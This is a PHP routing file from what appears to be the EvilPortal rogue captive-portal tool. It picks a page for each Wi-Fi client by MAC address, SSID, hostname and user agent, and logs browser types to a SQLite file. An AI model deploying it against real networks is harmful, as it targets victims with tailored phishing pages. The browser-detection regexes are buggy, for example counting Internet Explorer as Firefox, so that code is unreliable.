<?php
require_once('helper.php');
function increment_browser($browser)
{
    try {
        $sqlite = new \SQLite3('/tmp/landingpage.db');
    } catch (Exception $e) {
        return false;
    }
    $sqlite->exec('CREATE TABLE IF NOT EXISTS user_agents  (browser TEXT NOT NULL);');
    $statement = $sqlite->prepare('INSERT INTO user_agents (browser) VALUES(:browser);');
    $statement->bindValue(':browser', $browser, SQLITE3_TEXT);
    try {
        $ret = $statement->execute();
    } catch (Exception $e) {
        return false;
    }
    return $ret;
}
function identifyUserAgent($userAgent)
{
    if (preg_match('/(MSIE|Trident|(?!Gecko.+)Firefox)/', $userAgent)) {
        increment_browser('firefox');
    }else if (preg_match('/(?!AppleWebKit.+Chrome.+)Safari(?!.+Edge)/', $userAgent)) {
        increment_browser('safari');
    }else if (preg_match('/(?!AppleWebKit.+)Chrome(?!.+Edge)/', $userAgent)) {
        increment_browser('chrome');
    }else if (preg_match('/(?!AppleWebKit.+Chrome.+Safari.+)Edge/', $userAgent)) {
        increment_browser('edge');
    }else if (preg_match('/MSIE [0-9]\./', $userAgent)) {
        increment_browser('internet_explorer');
    } elseif (preg_match('/^Opera\/[0-9]{1,3}\.[0-9]/', $userAgent)) {
        increment_browser('opera');
    } else {
        increment_browser('other');
    }  
}
identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
/**
 *
 * DO NOT MODIFY THIS FILE
 * I highly recommend against modifying this file unless you know what you are doing!
 *
 * This file handles determining the destination file a client should see based on the conditions set in the json.
 *
 */

// The value for this variable needs to be set when an new instance of a portal is created
// EvilPortal does this automatically when a targeted portal is created by running:
// sed -i 's/"portal_name_here"/"{portalName}"/g' index.php
$PORTAL_NAME = "portal_name_here";

// Get the information about the client and map
// it to the rule key specified in the {$PORTAL_NAME}.ep file
$MAPPED_RULES = [
    "mac" => getClientMac($_SERVER['REMOTE_ADDR']),
    "ssid" => getClientSSID($_SERVER['REMOTE_ADDR']),
    "hostname" => getClientHostName($_SERVER['REMOTE_ADDR']),
    "useragent" => $_SERVER['HTTP_USER_AGENT']
];

// Read the json
$jsonData = json_decode(file_get_contents("{$PORTAL_NAME}.ep"), true);
$routeData = $jsonData['targeted_rules'];

// This variable represents the page to include
$includePage = null;

// Check rules to find the page
foreach ($routeData['rule_order'] as $key) {
    $includePage = handle_rule($routeData['rules'][$key], $MAPPED_RULES[$key]);
    if ($includePage != null) {
        include $includePage;
        break;
    }
}

// We have to display something.
// If the includePage variable is still null after checking the rules
// then include the default page.
if ($includePage == null) {
    include $routeData['default'];
}

/**
 * Checks if a given rule matches a given value
 * @param $rules: The rules to check the client data against
 * @param $client_data: The data to check if the rules match
 * @return string: If a rule matches it returns the page to include, null otherwise
 */
function handle_rule($rules, $client_data) {
    $return_value = null;
    foreach ($rules as $key => $val) {
        switch($key) {
            case "exact": // exact matches
                if (isset($val[$client_data])) {
                    $return_value = $val[$client_data];
                    break 2; // break out of the loop
                }
                break 1;

            case "regex": // regex matches
                foreach($val as $expression => $destination) {
                    if (preg_match($expression, $client_data)) {
                        $return_value = $destination;
                        break 1; // match was found. Exit this loop
                    }

                    if ($return_value != null)
                        break 2; // break out of the main loop
                }
                break 1;
        }
    }
    return $return_value;
}
